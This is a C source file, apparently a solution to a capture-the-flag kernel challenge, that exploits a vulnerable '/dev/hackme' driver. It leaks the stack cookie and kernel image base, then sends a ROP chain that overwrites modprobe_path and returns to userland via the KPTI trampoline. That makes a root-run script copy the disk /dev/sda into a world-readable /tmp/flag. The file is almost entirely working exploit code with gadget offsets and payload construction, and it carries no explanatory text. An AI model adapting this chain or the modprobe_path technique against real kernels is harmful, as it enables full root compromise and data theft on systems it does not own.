#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>

void open_dev(void);
void show_leaks(uint64_t *buf, int n);
void leak_stuff(void);
void overflow(void);
void save_state(void);
void add_img_base(void);
void get_flag(void);
int isCookie(uint64_t x);

int devfd;
uint64_t cookie;
uint64_t img_base;
uint64_t user_cs, user_ss, user_rflags, user_sp;

uint64_t prepare_kernel_cred = 0xffffffff814c67f0;
uint64_t commit_creds = 0xffffffff814c6410;
uint64_t modprobe_path = 0x1061820;

uint64_t pop_rdi_ret = 0xffffffff81006370;
// mov rdi, rax; mov qword ptr [rsi + 0x140], rdi; pop rbp
//uint64_t mov_rdi_rax = 0xffffffff816bf203;
uint64_t swapgs_pop_rbp_ret = 0xa55f;
uint64_t pop_rax_ret = 0x4d11;
uint64_t pop_rbx_r12_rbp_ret = 0x3190;
//0xffffffff8100306d: mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
uint64_t write_ptr_rbx_rax_pop2_ret = 0x306d;
uint64_t kpti_trampoline = 0x200f10 + 0x16;
uint64_t iretq = 0xc0d9;

void open_dev(void) {
  devfd = open("/dev/hackme", O_RDWR);
  if(devfd < 0) {
    puts("[!] Failed to open device...");
    exit(-1);
  }
  puts("[*] Opened device");
}

int isCookie(unsigned long x) {
  if(((x&0xff) == 0x00) && \
    ((x&0xffff000000000000) != 0xffff000000000000) && \
    (x>>(8*7+4)) > 0x00) {
    return 1;
  }
  return 0;
}

void show_leaks(unsigned long *buf, int n) {
  for(int i = 0; i < n; ++i) {
    printf("[*] Leak[%02d]: %lx\n", i, buf[i]);
    if(isCookie(buf[i])) {
      printf("----\n[+] Cookie FOUND @ idx=%02d --> %lx\n----\n", i, buf[i]);
    }
  }
}

void leak_stuff(void) {
  unsigned n = 40;
  uint64_t leak[n];
  ssize_t r = read(devfd, leak, sizeof(leak));
  //show_leaks(leak, n);
  printf("[*] Leaked %zd bytes\n", r);
  cookie = leak[16];
  img_base = leak[38] - 0xa157;
  printf("[+] Cookie : %lx\n", cookie);
  printf("[+] Image base: %lx\n", img_base);
  if(cookie == 0x00) {
    puts("[!] Failed to leak stack cookie");
    exit(-1);
  }
  if(img_base&0xfff != 0x00) {
    puts("[!] Failed to leak image base");
    exit(-1);
  }
}

void add_img_base(void) {
  pop_rax_ret += img_base;
  write_ptr_rbx_rax_pop2_ret += img_base;
  pop_rbx_r12_rbp_ret += img_base;
  modprobe_path += img_base;
  swapgs_pop_rbp_ret += img_base;
  kpti_trampoline += img_base;
}

void overflow(void) {
  uint8_t sz = 50;
  uint64_t payload[sz];
  uint8_t off = 16;
  payload[off++] = cookie;
  payload[off++] = 0x00; // rbx
  payload[off++] = 0x00; // r12
  payload[off++] = 0x00; // rbp
  payload[off++] = pop_rax_ret;
  payload[off++] = 0x782f706d742f;
  payload[off++] = pop_rbx_r12_rbp_ret;
  payload[off++] = modprobe_path;
  payload[off++] = 0x00; // r12
  payload[off++] = 0x00; // rbp
  payload[off++] = write_ptr_rbx_rax_pop2_ret;
  payload[off++] = 0x00; // pop1
  payload[off++] = 0x00; // pop2
  payload[off++] = kpti_trampoline;
  payload[off++] = 0x00; // rax
  payload[off++] = 0x00; // rdi
  payload[off++] = (uint64_t)get_flag; // user_rip
  payload[off++] = user_cs;
  payload[off++] = user_rflags;
  payload[off++] = user_sp;
  payload[off++] = user_ss;
  puts("[*] Overwriting modprobe path now...");
  ssize_t dat = write(devfd, payload, sizeof(payload));
  puts("----\n[!] Failed\n----");
}

void save_state(void) {
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
  puts("[+] Saved state");
}

void get_flag(void) {
  puts("[*] Returned to userland, inside get_flag()");
  /* /tmp/x: Copy all to /tmp/flag */
  system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
  system("chmod +x /tmp/x");
  /* create /tmp/dummy */
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
  system("chmod +x /tmp/dummy");
  /* run /tmp/dummy */
  puts("[*] Running /tmp/dummy");
  system("/tmp/dummy");
  puts("flag:");
  system("cat /tmp/flag");
  exit(0);
}

int main(void) {
  puts("** Running Exploit **");
  save_state();
  open_dev();
  leak_stuff();
  add_img_base();
  overflow();
  puts("----\n[!] Failed (main)\n----");
  return 0;
}
